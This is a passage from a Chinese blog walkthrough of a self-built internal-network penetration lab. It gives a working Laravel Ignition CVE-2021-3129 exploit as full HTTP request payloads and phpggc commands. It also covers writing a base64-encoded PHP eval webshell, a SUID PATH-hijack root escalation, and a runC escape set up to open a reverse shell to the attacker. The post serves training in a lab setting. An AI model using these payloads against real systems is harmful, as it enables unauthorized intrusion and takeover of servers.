本文转自我的Freebuf：  
我的博客：
@[toc]
## 前言
假期马上结束了，闲暇之时我自己尝试着搭建了一个内网渗透的靶场。靶场是根据比较新的漏洞进行搭建的，质量自以为还可以。
目前此靶场已在vulnstack开源，下载链接：
> 文中若有不当之处还请各位大佬多多点评
>
> 我的博客：
整个靶场的网络环境分为三层。从最初的信息收集、外网初探、攻入内网、搭建代理，横向移动，最终拿下域控。整个靶场所涉及的技术点大致如下：
  * **信息收集：**
    * 端口扫描
    * 端口服务识别
**漏洞利用：**
    * 漏洞搜索与利用
    * Laravel Debug mode RCE（CVE-2021-3129）漏洞利用
    * Docker逃逸
    * 通达OA v11.3 漏洞利用
    * Linux环境变量提权
    * Redis 未授权访问漏洞
    * Linux sudo权限提升（CVE-2021-3156）漏洞利用
    * SSH密钥利用
    * Windows NetLogon 域内权限提升（CVE-2020-1472）漏洞利用
    * MS14-068漏洞利用
**构建隧道：**
    * 路由转发与代理
      * 二层网络代理
      * 三层网络代理
**横向移动：**
    * 内网（域内）信息收集
    * MS17-010
    * Windows系统NTLM与用户凭据获取
    * SMB Relay攻击
    * Psexec远控利用
    * 哈希传递攻击（PTH）
    * WMI利用
    * DCOM利用
**权限维持：**
    * 黄金票据
    * 白银票据
    * Sid History
整个网络环境的拓扑图大致如下：
第二层网络中的所有主机皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。
## 外网渗透
假设渗透的目标客户只给出了一个域名：www.whopen.com，下面我们要在黑盒的情况下对目标网络进行渗透，最终需要拿下域控制器权限。
直接访问该域名，发现是一个博客的站点：  
随便翻翻除了文章写得还不错以外没有发现什么，emmmm......
### 信息收集
首先得到目标网站的IP为192.168.1.8，然后直接对目标IP进行端口扫描：
    nmap -T4 -sC -sV 192.168.1.8
如上图，目标除了80端口外还开启了22、81和6379端口。查看81端口：  
发现是个Laravel的站点，Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。
>
> 而在2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当Laravel开启了Debug模式时，由于Laravel自带的Ignition
> 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。
目标站点的Laravel版本正好在今年刚爆出来的Laravel Debug mode
RCE漏洞（CVE-2021-3129）的范围内，该漏洞的体用可以看我的这一篇文章：[《Laravel Debug mode
RCE（CVE-2021-3129）漏洞复现》](https://whoamianony.top/2021/01/15/漏洞复现/Laravel/Laravel
Debug mode RCE（CVE-2021-3129）利用复现/) ，下面我们尝试进行初步的攻击。
### Laravel Debug mode RCE漏洞利用
（1）首先使用 [phpggc](https://github.com/ambionics/phpggc)
工具生成一条laravel中存在的反序列化利用POC（经过编码后的）：
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：
（2）发送如下数据包，将Laravel的原日志文件laravel.log清空：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.8:81
    Content-Type: application/json
    Content-Length: 328
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }
（3）发送如下数据包，给Log增加一次前缀，用于对齐：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.8:81
    Content-Type: application/json
    Content-Length: 163
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "AA"
      }
    }
（4）将之前生成的编码后的POC作为viewFile的值，发送数据包：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.8:81
    Content-Type: application/json
    Content-Length: 5058
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=......2B=00=57=00=61=00=63=00=4E=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"
      }
    }
（5）发送如下数据包，清空对log文件中的干扰字符，只留下POC：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.8:81
    Content-Type: application/json
    Content-Length: 299
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }
这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试。
（6）使用 `phar://` 进行反序列化，执行任意代码（此时需要使用绝对路径）：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.8:81
    Content-Type: application/json
    Content-Length: 210
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
      }
    }
如下图所示，PHPINFO已成功执行，漏洞利用成功：  
我们可以利用该漏洞写入Webshell：
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
重复上述利用步骤后，成功写入webshell并连接成功：  
我们在使用蚁剑执行命令时发现目标主机的主机名有点显眼，可能我们那下的shell处于一个容器环境：  
使用如下命令进行测试，我们发现我们获得的shell确实运行在一个docker容器内：
    cat /proc/self/cgroup
这样好吗，这样不好！下面我们需要docker逃逸来获取目标主机（docker宿主机）的权限。但此时我们所获得的是www-data用户的权限，权限比较低，干不成什么大事，所以要想办法提升一下权限。官方文档中提到了Linux环境变量提权，我们直接使用find命令来搜索具有SUID或4000权限的文件：
    find / -perm -u=s -type f 2>/dev/null
通过执行上述命令，攻击者可以遍历任何可执行文件，在这里我们可以看到/home/jobs目录下有一个shell文件，这名字很显眼，并且其具有SUID权限：  
于是我们cd到/home/jobs目录下，ls一下，确实看到了名为shell的可执行文件。我们运行一下这个文件：  
可以看到shell文件执行了ps命令，并且未使用绝对路径，所以我们可以尝试更改$PATH来执行我们的恶意程序，从而获得目标主机的高权限shell。
首先使用蚁剑反弹一个shell过来，然后在shell中执行如下命令：
    cd /tmp
    echo "/bin/bash" > ps
    chmod 777 ps
    echo $PATH 
    export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序
    cd /home/jobs
    ./shell
    # 然后就获得了root权限，可以执行命令了
如上图所示，成功提升为root权限。
之后为了方便，我们可以使用msf生成一个木马，然后上传到目标主机上执行，来获得一个metasploit的meterpreter，具体步骤略。
### 利用Docker runC漏洞逃逸
该漏洞（CVE-2019-5736）是2019年爆出的。在Docker
18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。
利用该漏洞需要满足以下两个条件之一：
  * 由一个攻击者控制的恶意镜像创建
  * 攻击者具有某已存在容器的写权限，且可通过docker exec进入。
首先下载攻击脚本： 
打开main.go脚本，将脚本中要在目标机上执行的命令修改为反弹shell的命令，IP为攻击机IP，端口为攻击机监听的端口：  
执行命令编译生成payload
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
将生成的利用程序main上传到目标主机并赋予权限：  
接着在攻击机kali上面启动nc监听：
    nc -lvp 2333
接着在目标docker上面运行main文件：  
此时，只需等待目标机管理员重启该docker容器，payload就会触发。但是由于某些原因，我们手动重启docker后并未收到目标主机的shell。所以我们只能用另一种方法来逃逸。
### Docker 特权模式逃逸
特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。
使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run
—privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。
当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。
首先我们现在docker中新建一个/hack目录用来挂在文件：